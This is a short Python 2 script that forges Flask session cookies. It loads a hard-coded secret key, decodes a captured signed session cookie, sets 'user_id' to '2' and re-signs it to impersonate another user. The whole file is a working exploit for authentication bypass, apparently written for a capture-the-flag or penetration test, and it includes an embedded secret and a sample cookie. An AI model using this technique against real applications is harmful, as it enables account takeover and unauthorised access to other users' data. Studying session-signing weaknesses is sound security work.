from flask.sessions import SecureCookieSessionInterface
from itsdangerous import base64_decode, base64_encode, BadSignature, URLSafeTimedSerializer
import sys
import base64
import zlib
from flask import json

class CookieSessionInterface(SecureCookieSessionInterface):
  def __init__(self, secret_key):
    self.secret_key = secret_key
    if not secret_key:
      return None
    signer_kwargs = dict(
      key_derivation=self.key_derivation,
      digest_method=self.digest_method
    )
    self.sign_serializer = URLSafeTimedSerializer(secret_key, salt=self.salt,
                                  serializer=self.serializer,
                                  signer_kwargs=signer_kwargs)

  def decode(self, cookie):
    return self.sign_serializer.loads(cookie)

  def encode(self, cookie):
    return self.sign_serializer.dumps(cookie)


def decode(cookie):
    compressed = False
    payload = cookie
    if payload.startswith('.'):
        compressed = True
        payload = payload[1:]
    data = payload.split(".")[0]
    data = base64_decode(data)
    if compressed:
        data = zlib.decompress(data)
    return data

def encode(x):
    return zlib.compress(x)


if __name__=='__main__':
    secret = '9806d62bb5f4986c09a3872abf448e85'
    cookie = '.eJwljzFuAzEMBP-i2oVEiiLlzxxIikSCGA5wF1dG_h4BKafYwc67HHnG9VHuqY8rbuX4XOVempkBRV9jUZ3NSTWsbWiiHULcBSnD01dHYm-9rWFzzTEJg5AVmX25yWbA2DqGYclkglOqTk0TIp4uSVVQ2ICDDOboFFhuxa8zj5_vr3juP5V0VoFAtGodRm2ckaCGrokN63InUti71xXnfwTW8vsHf4U_yg.XZIQcw.-J3iS9sG2pf6ke2Ay-8yCwTsO4E'
    csi = CookieSessionInterface(secret)
    decoded_cookie = csi.decode(cookie)
    print "* ORIGINAL COOKIE:", decoded_cookie

    decoded_cookie['user_id'] = u"2"
    print "* MODIFIED COOKIE", decoded_cookie

    new_cookie = csi.encode(decoded_cookie)
    print "+ MODIFIED SECRET ENCODED COOKIE:", new_cookie
